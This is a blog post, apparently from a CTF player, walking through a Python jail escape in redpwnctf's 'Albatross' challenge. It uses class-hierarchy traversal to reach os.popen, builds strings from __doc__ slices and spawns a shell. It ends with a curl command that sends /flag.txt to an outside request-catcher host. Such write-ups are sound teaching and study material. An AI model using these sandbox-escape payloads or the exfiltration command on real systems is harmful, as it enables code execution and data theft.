@@ -1,0 +1,388 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>the pepsi place | Albatross: Breaking out of pyjail with your hands tied.</title>
+  <meta name="description" content="Writeup to redpwnctf's Albatross challenge, where you'd need to take advantage of a python 'eval' without using ASCII characters, strings, and no python builtin functions.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Albatross: Breaking out of pyjail with your hands tied.">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://blog.pepsipu.com/posts/albatross-redpwnctf">
+  <meta property="og:description" content="Writeup to redpwnctf's Albatross challenge, where you'd need to take advantage of a python 'eval' without using ASCII characters, strings, and no python builtin functions.">
+  <meta property="og:site_name" content="the pepsi place">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://blog.pepsipu.com/posts/albatross-redpwnctf">
+  <meta name="twitter:title" content="Albatross: Breaking out of pyjail with your hands tied.">
+  <meta name="twitter:description" content="Writeup to redpwnctf's Albatross challenge, where you'd need to take advantage of a python 'eval' without using ASCII characters, strings, and no python builtin functions.">
+
+  
+    <meta property="og:image" content="https://blog.pepsipu.com/assets/og-image-04fbfc4e15efb2f7c4cde09b072db471162ce6a646dd0d04e1f19eec72491c9b.jpg">
+    <meta name="twitter:image" content="https://blog.pepsipu.com/assets/og-image-04fbfc4e15efb2f7c4cde09b072db471162ce6a646dd0d04e1f19eec72491c9b.jpg">
+  
+
+  <link href="https://blog.pepsipu.com/feed.xml" type="application/rss+xml" rel="alternate" title="the pepsi place Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-dark-11327753546b2135c989eee5cd83497a2734b702928d016839d795f6c706e3d5.ico">
+      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-dark-d161409442b7e523089f24d08d0a55951549ece7504207c376d53b020713494d.png">
+      <link rel="stylesheet" type="text/css" href="/assets/dark-831218bc9e41aef39ee6a0bae4501195bccafcc13101ae2b9cd20493a6ec04c0.css">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="the pepsi place">the pepsi place</a>
+  <ul class="header-links">
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/pepsipu" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://instagram.com/sam.hajhamid" rel="noreferrer noopener" target="_blank" title="Instagram">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-instagram">
+  <use href="/assets/instagram-37f85bc75b43ecc4c114d9a46f846327fe13c5893787c6afbcfef9d30d58bd9e.svg#icon-instagram" xlink:href="/assets/instagram-37f85bc75b43ecc4c114d9a46f846327fe13c5893787c6afbcfef9d30d58bd9e.svg#icon-instagram"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:pepsipu@pepsipu.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="/feed.xml" rel="noreferrer noopener" target="_blank" title="RSS">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-rss">
+  <use href="/assets/rss-541ec5cea9cefd10d2fcfec01888f3f231a8829940249835fa7b7b3a12ae0d0d.svg#icon-rss" xlink:href="/assets/rss-541ec5cea9cefd10d2fcfec01888f3f231a8829940249835fa7b7b3a12ae0d0d.svg#icon-rss"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+  </ul>
+</nav>
+
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Albatross: Breaking out of pyjail with your hands tied.</h1>
+            <p>Writeup to redpwnctf's Albatross challenge, where you'd need to take advantage of a python 'eval' without using ASCII characters, strings, and no python builtin functions.</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    June 25, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/ctf" title="See all posts with tag 'ctf'">ctf</a>
+    
+      
+      <a href="/tag/misc" title="See all posts with tag ''"></a>
+    
+      
+      <a href="/tag/pyjail" title="See all posts with tag ''"></a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <h1 id="introduction">Introduction</h1>
+
+<p>In <a href="https://2020.redpwn.net/">redpwnctf</a> this year, there was a really cool python exploit challenge! The goal was to take advantage of an <code class="highlighter-rouge">eval</code> to read a flag from the server. There were a couple catches though.</p>
+
+<ul>
+  <li>No ASCII characters!</li>
+  <li>No built in functions!</li>
+  <li>No strings!</li>
+  <li>No more than 102 characters!</li>
+</ul>
+
+<p>Woah, that’s not looking too easy. But it’s alright, since we can use a couple tricks up our sleeves to get a shell and ultimately read the flag. Let’s go over each requirement and how we are going to bypass it.</p>
+
+<h2 id="no-ascii-characters">No ASCII characters?</h2>
+
+<p>That’s alright! The target python version, python 3.7, allows you to use <em>italized</em> characters to write your expressions, which aren’t ascii. We encoded our payloads using italics on <a href="https://lingojam.com/ItalicTextGenerator">this website</a>. This way our payload can fly by the blacklist, easy peasy.</p>
+
+<h2 id="no-built-in-functions">No built in functions?</h2>
+
+<p>This is the trickier parts of breaking out of pyjail. The <code class="highlighter-rouge">eval</code> sets the <code class="highlighter-rouge">__builtins__</code> variable to <code class="highlighter-rouge">None</code>, so we unfortunately can’t use builtin functions to read from the file system. This means no <code class="highlighter-rouge">open</code>, no <code class="highlighter-rouge">execfile</code>, no nothing. That’s ok, because we can use a little trick to access other modules without needing to import them, as well as without builtins.</p>
+
+<h3 id="the-python-class-hierarchy">The Python Class Hierarchy</h3>
+
+<p>The python class hierarchy is going to be our gateway to accessing other modules, like <code class="highlighter-rouge">os</code>, so we can read from the filesystem or get a shell. So, how do we do this? Well, we’re going to need to learn how to traverse the python class hierarchy. First, let’s take a look at the following code.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">().</span><span class="n">__class__</span>
+</code></pre></div></div>
+
+<p>What does this do? Well, the <code class="highlighter-rouge">__class__</code> attribute of returns the class of an instance. For example, if we had a class, <code class="highlighter-rouge">CoolCat</code>, like this and an instance of that class, <code class="highlighter-rouge">charlie</code>…</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">CoolCat</span><span class="p">:</span>
+  <span class="k">def</span> <span class="nf">say_hi</span><span class="p">():</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"hello!"</span><span class="p">)</span>
+<span class="n">charlie</span> <span class="o">=</span> <span class="n">CoolCat</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>We’d be able to access <code class="highlighter-rouge">CoolCat</code> from <code class="highlighter-rouge">charlie</code> through the <code class="highlighter-rouge">__class__</code> attribute!</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">assert</span> <span class="p">(</span><span class="n">charlie</span><span class="p">.</span><span class="n">__class__</span> <span class="o">==</span> <span class="n">CoolCat</span><span class="p">),</span> <span class="s">"This assertion will never fail!"</span>
+</code></pre></div></div>
+
+<h2 id="__base__"><code class="highlighter-rouge">__base__</code></h2>
+
+<p>So, if we go back to our first example, we would get the class <code class="highlighter-rouge">tuple</code>, which will help us in a bit. The next thing we are going to talk about is <code class="highlighter-rouge">__base__</code>. <code class="highlighter-rouge">__base__</code> allows to access the parent of a class. The parent of all classes who don’t already have a parent is <code class="highlighter-rouge">object</code>. So, we can structure our hierarchy a little like this:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>       /-tuple
+object-
+       \-CoolCat
+</code></pre></div></div>
+
+<p>Now, there are <strong>way</strong> more classes which inherit from object. But for now, let’s consider these two cases.</p>
+
+<p>So we know we can go from a child class (like <code class="highlighter-rouge">tuple</code> or <code class="highlighter-rouge">CoolCat</code>) to a parent class (like <code class="highlighter-rouge">object</code>) by using <code class="highlighter-rouge">__base__</code>, but can we go the other way around? Can we use a property of <code class="highlighter-rouge">object</code> to access <code class="highlighter-rouge">CoolCat</code> or <code class="highlighter-rouge">tuple</code>? And the answer is yes! With the power of the <code class="highlighter-rouge">__subclasses__</code> function.</p>
+
+<h2 id="__subclasses__"><code class="highlighter-rouge">__subclasses__</code></h2>
+
+<p>Subclasses allow us to find classes which inherit from a given class. For example, if I wanted to find the classes which inherit from <code class="highlighter-rouge">CoolCat</code>, I’d call <code class="highlighter-rouge">__subclasses__</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">CoolCat</span><span class="p">.</span><span class="n">__subclassess__</span><span class="p">()</span>
+<span class="c1"># -&gt; []
+# this outputs an empty array because nothing currently inherits from CoolCat!
+</span></code></pre></div></div>
+
+<p>Now, what would happen if we called <code class="highlighter-rouge">__subclasses__</code> on the <code class="highlighter-rouge">object</code> class? Well, we’d get a list of classes which inherit from the <code class="highlighter-rouge">object</code> class, including <code class="highlighter-rouge">CoolCat</code> and <code class="highlighter-rouge">tuple</code>. Remember how I said there’s a lot more than just <code class="highlighter-rouge">CoolCat</code> and <code class="highlighter-rouge">tuple</code>? Well, turns out, the <code class="highlighter-rouge">__subclasses__</code> function returns <strong>all</strong> of the subclasses, including classes from other modules! This means that this <code class="highlighter-rouge">__subclasses__</code> will be our connection to ouside the <code class="highlighter-rouge">eval</code> jail. Putting together all we learned, <code class="highlighter-rouge">__class__</code>, <code class="highlighter-rouge">__base__</code>, and <code class="highlighter-rouge">__subclasses__</code>, we can get a list of all classes, including other modules, that inherit from <code class="highlighter-rouge">object</code>. Next, we’ll cover how to go from accessing a class from another module to accessing the module itself.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()</span>
+<span class="c1"># -&gt; [&lt;class 'type'&gt;, &lt;class 'weakref'&gt;, &lt;class 'weakcallableproxy'&gt;, &lt;class 'weakproxy'&gt;, &lt;class 'int'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes'&gt;, ..., &lt;class 'rlcompleter.Completer'&gt;]
+# includes classes from the python builtins (int, bytearray, str, etc etc) but also classes from other modules (re.Scanner, operator.methodcaller, etc etc etc) and even CoolCat (__main__.CoolCat)!
+</span></code></pre></div></div>
+
+<h3 id="from-class-to-module">From Class to Module</h3>
+
+<p>So we’ve found our link to other modules. We can access classes from other modules through subclasses, but how do we access variables and functions from those modules? Well, let’s go over what <code class="highlighter-rouge">__globals__</code> does and how we can use it.</p>
+
+<p><code class="highlighter-rouge">__globals__</code> is a variable defined for all functions. It is a dictionary that contains all the variables and functions in the global scope that have the same module scope as itself. This means if we can get a function from a class in another module, we’d be able to access the global scope of another module through that function’s <code class="highlighter-rouge">__globals__</code> property! So… what functions can we use that is present in all classes? Well, a function which is present in all classes no matter the class’s functions or properties is <code class="highlighter-rouge">__init__</code>.</p>
+
+<p>Let’s say, in main, we have a global variable named <code class="highlighter-rouge">jamie</code>. Going back to the <code class="highlighter-rouge">CoolCat</code> class and <code class="highlighter-rouge">charlie</code>, how can we access <code class="highlighter-rouge">jamie</code> by only accessing properties of <code class="highlighter-rouge">charlie</code>? Well, we just need a function that’s defined in <code class="highlighter-rouge">CoolCat</code>! <code class="highlighter-rouge">CoolCat</code> has <code class="highlighter-rouge">say_hi</code> defined, so we could use that, or we can use the <code class="highlighter-rouge">__init__</code> function which is present in all classes.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">charlie</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s">"jamie"</span><span class="p">]</span>
+</code></pre></div></div>
+
+<h3 id="putting-it-all-together">Putting it all together</h3>
+
+<p>Now, let’s try combining the hierarchy traversal method with the function global variable lookup to access the <code class="highlighter-rouge">os</code> module’s <code class="highlighter-rouge">popen</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># the index for the class "os._wrap_close" in the list of subclasses is 127
+</span><span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">127</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s">"popen"</span><span class="p">](</span><span class="s">"sh"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Just like that, we’ve accessed the <code class="highlighter-rouge">popen</code> function! We can run arbitrary commands on the machine now with this function. Here, I’ve run the “sh” command, which opens a shell. But wait… We can’t use strings??!!</p>
+
+<h2 id="no-strings">No Strings?</h2>
+
+<p>Our exploit above requires us to use two strings. “popen” and “sh” are both required for our exploit to work! “popen” grabs the <code class="highlighter-rouge">popen</code> function from the <code class="highlighter-rouge">__globals__</code> dictionary, and “sh” is needed to open a shell. Surely there must be a way to not need to use strings or make these strings without quotes?</p>
+
+<h3 id="string-frankenstein-making-strings-from-segments-of-other-strings">String Frankenstein: Making strings from segments of other strings</h3>
+
+<p>Strings in python is that they can be sliced and concatinated. You can turn one string into an entirely new string just with indexing and concatination. Watch how I transform one string into another one:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="s">"I hate pyjails!"</span>
+<span class="n">s</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">+</span> <span class="n">s</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span>
+<span class="c1"># -&gt; 'pepsi'
+</span></code></pre></div></div>
+
+<p>Maybe we can use strings from instances of classes to create a string made up of other strings? Well, what strings are present in classes? Well, <code class="highlighter-rouge">__doc__</code>, of course! <code class="highlighter-rouge">__doc__</code> is a property which provides documentation on a type. In this case, we can leverage that to our advantage.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">().</span><span class="n">__doc__</span>
+<span class="c1"># -&gt; 'Built-in immutable sequence.\n\nIf no argument is given, the constructor returns an empty tuple.\nIf iterable is specified the tuple is initialized from iterable's items.\n\nIf the argument is a tuple, the return value is the same object.'
+</span></code></pre></div></div>
+
+<p>Just like that, a string we can mess with! So, to build the string ‘sh’…</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">().</span><span class="n">__doc__</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">+</span> <span class="p">().</span><span class="n">__doc__</span><span class="p">[</span><span class="mi">56</span><span class="p">]</span>
+<span class="c1"># -&gt; 'sh'
+</span></code></pre></div></div>
+
+<p>String requirement alleviated! Let’s apply this to our exploit.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">127</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">[().</span><span class="n">__doc__</span><span class="p">[</span><span class="mi">84</span><span class="p">]</span><span class="o">+</span><span class="p">().</span><span class="n">__doc__</span><span class="p">[</span><span class="mi">34</span><span class="p">]</span><span class="o">+</span><span class="p">().</span><span class="n">__doc__</span><span class="p">[</span><span class="mi">84</span><span class="p">]</span><span class="o">+</span><span class="p">().</span><span class="n">__doc__</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span><span class="o">+</span><span class="p">().</span><span class="n">__doc__</span><span class="p">[</span><span class="mi">7</span><span class="p">]](().</span><span class="n">__doc__</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span><span class="o">+</span><span class="p">().</span><span class="n">__doc__</span><span class="p">[</span><span class="mi">56</span><span class="p">])</span>
+</code></pre></div></div>
+
+<p>It works! But hold on… this is 170 characters??!?!?</p>
+
+<h2 id="no-more-than-102-characters">No more than 102 characters?</h2>
+
+<p>Making strings occupies <strong>a lot</strong> of characters. This means we have two routes.</p>
+
+<ul>
+  <li>Find a more efficent method of creating strings</li>
+  <li>Don’t make strings</li>
+</ul>
+
+<p>I’ll get “popen” without strings, and shorten our method of getting “sh”.</p>
+
+<h3 id="the-popen-predicament">The “popen” predicament</h3>
+
+<p>Currently, we index <code class="highlighter-rouge">__globals__</code> with <code class="highlighter-rouge">popen</code> in order to get the <code class="highlighter-rouge">popen</code> function. What if there was a better way to index it, without strings? Well, we can extract just the values from a dictionary and put them into an array. That way, we can index the <code class="highlighter-rouge">__globals__</code> dictonary with integer indexes, no longer needing strings! Let’s first get the values of the dictionary as an array, throwing away the keys.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">127</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">values</span><span class="p">()</span>
+<span class="c1"># -&gt; dict_values([...])
+</span></code></pre></div></div>
+
+<p>Wait.. this doesn’t return an array! This returns a <code class="highlighter-rouge">dict_list</code> class! That’s alright. We can use a new python feature to convert a array-like object, like a  <code class="highlighter-rouge">dict_list</code>, to an array that we can index.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">*</span><span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">127</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">values</span><span class="p">()]</span>
+<span class="c1"># -&gt; [..., &lt;function fdopen at 0x10fc40ef0&gt;, &lt;function _fspath at 0x10fc43320&gt;, &lt;class 'os.PathLike'&gt;]
+</span></code></pre></div></div>
+
+<p>Phew, now we can index this array by a number!</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">*</span><span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">127</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">values</span><span class="p">()][</span><span class="o">-</span><span class="mi">5</span><span class="p">]()</span>
+<span class="c1"># -&gt; &lt;function popen at 0x10fc40e60&gt;
+</span></code></pre></div></div>
+
+<p>We’ve reduced indexing <code class="highlighter-rouge">popen</code> to just 82 characters.</p>
+
+<h3 id="the-sh-situation">The “sh” situation</h3>
+
+<p>We’ve got 20 characters left to make the “sh” string. We’ve got no more gimmicks like what he had with”popen”, so we’ve got to think of a new method. I figured we’d only be able to make one reference to <code class="highlighter-rouge">__doc__</code>, because <code class="highlighter-rouge">().__doc__[]</code> costs 12 characters. This seems impossible without string slicing a string which already has “sh” within it, but it’s actually not. String slicing has one more trick up it’s sleeve that will allow us to construct “sh” in just a few characters. Standard string slicing allows us to select a range of characters from a string and extract them. For example:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">"why is pyjail so hard?"</span><span class="p">[</span><span class="mi">7</span><span class="p">:</span><span class="mi">13</span><span class="p">]</span>
+<span class="c1"># -&gt; 'pyjail'
+</span></code></pre></div></div>
+
+<p>But, there’s one more thing string slicing can do. There’s a 3rd parameter for string slicing, known as “stride”, which specifies how many characters to move forward after the a character is read from the string. By default, the stride is one, but we can customize it to however much we want. So, what if we first set the starting index to the first index of ‘s’, then set the stride large enough so that the next character is the last index of ‘h’? This would mean after ‘s’ is read, the stride would jump a huge amount of characters, all the way until the last ‘h’, at which no more strides can be taken because the string is not long enough. So, our slice would be equivlient to:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">doc</span> <span class="o">=</span> <span class="p">().</span><span class="n">__doc__</span>
+<span class="n">doc</span><span class="p">[</span><span class="n">doc</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="s">'s'</span><span class="p">)::</span><span class="n">doc</span><span class="p">.</span><span class="n">rindex</span><span class="p">(</span><span class="s">'h'</span><span class="p">)</span> <span class="o">-</span> <span class="n">doc</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="s">'s'</span><span class="p">)]</span>
+<span class="c1"># -&gt; 'sh'
+</span></code></pre></div></div>
+
+<p>Simplifying this:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">().</span><span class="n">__doc__</span><span class="p">[</span><span class="mi">19</span><span class="p">::</span><span class="mi">199</span><span class="p">]</span>
+<span class="c1"># -&gt; 'sh'
+</span></code></pre></div></div>
+
+<h2 id="no-problem">No problem?</h2>
+
+<p>Let’s put it all together, for real this time. Don’t forget to italicize your payload!</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">*</span><span class="p">().</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">127</span><span class="p">].</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">values</span><span class="p">()][</span><span class="o">-</span><span class="mi">5</span><span class="p">](().</span><span class="n">__doc__</span><span class="p">[</span><span class="mi">19</span><span class="p">::</span><span class="mi">199</span><span class="p">])</span>
+</code></pre></div></div>
+
+<h3 id="small-problem">Small problem?</h3>
+
+<p>Yea.. slight problem. Unfortunately, due to <code class="highlighter-rouge">popen</code>’s functionality, we can’t see the output of the programs we run. But that’s alright! We can use <code class="highlighter-rouge">curl</code> to send the flag as the body of a POST request to a <a href="https://requestcatcher.com">request catcher</a>.</p>
+
+<p>This is what I used:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="sb">`</span><span class="nb">cat</span> /flag.txt<span class="sb">`</span> https://pepsipu.requestcatcher.com
+</code></pre></div></div>
+
+<p>And on the request catcher, the recieved request is:</p>
+
+<p><img src="https://i.gyazo.com/0d4f13ab469df40451b9c290c2f2dc21.png" alt="request catcher with flag" /></p>
+
+<p>There’s our flag!</p>
+
+<p><code class="highlighter-rouge">flag{SH*T_I_h0pe_ur_n0t_b1c..._if_y0u_@r3,_th1$_isn't_th3_fl@g}</code></p>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=Albatross:+Breaking+out+of+pyjail+with+your+hands+tied.%20-%20https://blog.pepsipu.com/posts/albatross-redpwnctf" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://blog.pepsipu.com/posts/albatross-redpwnctf" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    sponsored by subpar blue: terrorizing tcaches since 2017
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-XQXDK9JQPD"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-XQXDK9JQPD');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-3ee2c63bbac916f96cd7f90e83ab767f058ead1301444c9966f5156911c8be7f.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+</body>
+</html>
